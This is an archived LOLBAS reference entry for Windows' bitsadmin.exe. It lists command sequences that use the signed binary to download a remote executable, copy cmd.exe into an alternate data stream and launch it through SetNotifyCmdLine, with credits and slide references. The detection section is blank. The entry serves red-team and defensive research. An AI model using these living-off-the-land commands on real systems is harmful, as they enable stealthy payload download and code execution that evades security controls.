# UPDATE BOOKMARKS - PROJECT MOVED TO A DEDICATED PROJECT SITE. THIS SITE WILL NOT BE UPDATED ANYMORE, BUT WILL BE KEPT FOR HISTORICAL REASONS.
New site: https://github.com/LOLBAS-Project/LOLBAS
Web portal: https://lolbas-project.github.io/ 
## Bitsadmin.exe

* Functions: Execute, Download, Copy, Read ADS

```
bitsadmin /create 1   
bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe    
bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL    
bitsadmin /RESUME 1   
bitsadmin /complete 1

bitsadmin /create 1   
bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe   
bitsadmin /RESUME 1   
bitsadmin /complete 1   


bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset    

bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset   
```

Acknowledgements:
* Rob Fuller - @mubix 
* Chris Gates - @carnal0wnage
* Oddvar Moe - @oddvarmoe

Code sample:
* 

Resources:
* https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679 - Slide 53
* https://www.youtube.com/watch?v=_8xJaaQlpBo
* https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f

Full path:
```
c:\windows\system32\bitsadmin.exe
c:\windows\sysWOW64\bitsadmin.exe
```

Notes:
* Requires active user (doesn't work from a web shell)


Detection:

 
